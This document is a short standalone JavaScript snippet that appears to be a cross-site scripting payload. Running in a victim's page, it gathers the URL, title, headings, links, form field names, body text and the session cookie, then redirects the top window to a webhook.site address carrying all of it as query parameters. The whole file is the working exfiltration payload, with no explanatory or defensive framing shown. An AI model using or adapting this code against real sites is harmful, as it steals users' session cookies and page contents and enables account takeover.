(() => {
  const WEBHOOK = 'https://webhook.site/TU-ID';

  const take = (s, n = 300) => (s || '').replace(/\s+/g, ' ').trim().slice(0, n);

  const links = [...document.querySelectorAll('a[href]')]
    .slice(0, 12)
    .map(a => `${take(a.innerText, 40)}=>${a.getAttribute('href')}`)
    .join(' | ');

  const forms = [...document.forms]
    .slice(0, 8)
    .map((f, i) => {
      const inputs = [...f.querySelectorAll('input,textarea,select')]
        .slice(0, 12)
        .map(el => `${el.name || '(noname)'}:${el.type || el.tagName.toLowerCase()}`)
        .join(',');
      return `f${i}[${(f.method || 'GET').toUpperCase()} ${f.getAttribute('action') || location.pathname}] ${inputs}`;
    })
    .join(' | ');

  const h = [...document.querySelectorAll('h1,h2,h3')]
    .slice(0, 6)
    .map(x => take(x.innerText, 80))
    .join(' | ');

  const body = take(document.body ? document.body.innerText : '', 800);

  const u = new URL(WEBHOOK);
  u.searchParams.set('type', 'debug');
  u.searchParams.set('href', location.href);
  u.searchParams.set('path', location.pathname);
  u.searchParams.set('title', document.title || '');
  u.searchParams.set('heads', h);
  u.searchParams.set('links', links);
  u.searchParams.set('forms', forms);
  u.searchParams.set('body', body);
  u.searchParams.set('cookie', document.cookie || '');

  top.location = u.toString();
})();
